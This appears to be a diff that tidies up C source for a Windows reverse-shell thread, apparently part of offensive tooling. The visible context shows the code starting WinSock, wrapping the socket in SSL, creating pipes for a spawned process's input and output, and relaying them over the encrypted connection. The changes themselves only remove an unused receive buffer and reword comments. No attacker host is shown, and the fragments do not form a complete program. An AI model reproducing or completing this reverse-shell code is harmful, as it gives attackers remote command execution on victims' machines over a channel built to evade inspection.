@@ -94,7 +94,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     struct sockaddr_in shell_addr;
-    char RecData[512];
     int connection;
 
     //Initializing WinSock Version 2
@@ -140,8 +139,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     SSL_set_fd(ssl, shell);
     SSL_connect(ssl);
 
-    //Recv Socket, Where to Store Data, Max Size to Receive, 0
-    //recv(shell, RecData, sizeof(RecData), 0);   
     //Set Value of Startup Infra Buffer to 0 (& means address)
     ZeroMemory(&sinfo, sizeof(sinfo));
     //Size of Structure
@@ -157,6 +154,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
 
     //Initialize Security Attributes
     SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    
     //Pipe for Standard Input
     HANDLE hStdinRead, hStdinWrite;
     CreatePipe(&hStdinRead, &hStdinWrite, &saAttr, 0);
@@ -198,7 +196,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
             memset(buffer, 0, sizeof(buffer));
     }
 
-    //Close Stuff
+    //Close Handles
     CloseHandle(hStdinWrite);
     CloseHandle(hStdoutRead);
     SSL_shutdown(ssl);
@@ -206,8 +204,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     SSL_CTX_free(ctx);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
-    //Set Value of Receiving Server Buffer to 0
-    ZeroMemory(RecData, sizeof(RecData));
 
 }
 
